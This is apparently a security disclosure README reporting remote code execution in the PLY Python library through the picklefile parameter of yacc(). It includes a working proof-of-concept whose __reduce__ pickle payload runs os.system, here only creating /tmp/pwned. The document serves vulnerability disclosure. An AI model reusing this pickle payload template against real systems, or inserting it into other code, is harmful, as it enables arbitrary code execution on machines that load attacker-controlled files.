# 🚨 Undocumented RCE in PLY via `picklefile` Parameter

> 📅 Reported by: **Ahmed Abd**  
> 🗓️ Date: **July 1, 2025**  
> 🐍 Affects: [PLY (Python Lex-Yacc)](http://www.dabeaz.com/ply/)

## 📌 Summary

This repository contains a proof-of-concept demonstrating a critical **Remote Code Execution (RCE)** vulnerability in the [PLY](http://www.dabeaz.com/ply/) library via the undocumented `picklefile` parameter in the `yacc()` function.

The issue arises because `picklefile` allows loading parsing tables from a Python pickle file without any validation. If the file is malicious, it can execute arbitrary code during deserialization.

---

## ⚠️ Vulnerability Details

- **Function Affected:** `ply.yacc.yacc(picklefile=...)`
- **Issue:** Deserializes a pickle file using `pickle.load()` with no validation
- **Impact:** Arbitrary command execution if the attacker can control the `.pkl` file
- **Exposure Risk:** High in environments where pickle files are stored remotely or shared
- **CVE Status:** ⚠️ *Unassigned* (may warrant CVE depending on maintainer response)

---

## 🔬 Proof of Concept

This PoC creates:
- A minimal lexer and parser
- A malicious pickle file that runs a shell command on load

When `yacc(picklefile='exploit.pkl')` is called, it runs the system command to create `/tmp/pwned`.

```python
import pickle
import os
from ply.lex import lex
from ply.yacc import yacc

tokens = ('EXAMPLE',)
def t_EXAMPLE(t):
    r'example'
    return t

def p_sample(p):
    'sample : EXAMPLE'
    pass

class Exploit:
    def __reduce__(self):
        cmd = 'touch /tmp/pwned && echo "VULNERABLE" > /tmp/pwned'
        return (os.system, (cmd,))

malicious_data = {
    '_tabversion': '3.11',
    '_lr_action': {0: {}},
    '_lr_goto': {0: {}},
    '_lr_productions': [
        (None, 0, 0, 0, Exploit())
    ],
    '_lr_method': 'LALR'
}

with open('exploit.pkl', 'wb') as f:
    pickle.dump(malicious_data, f)

parser = yacc(picklefile='exploit.pkl', debug=False, write_tables=False)
parser.parse('example')
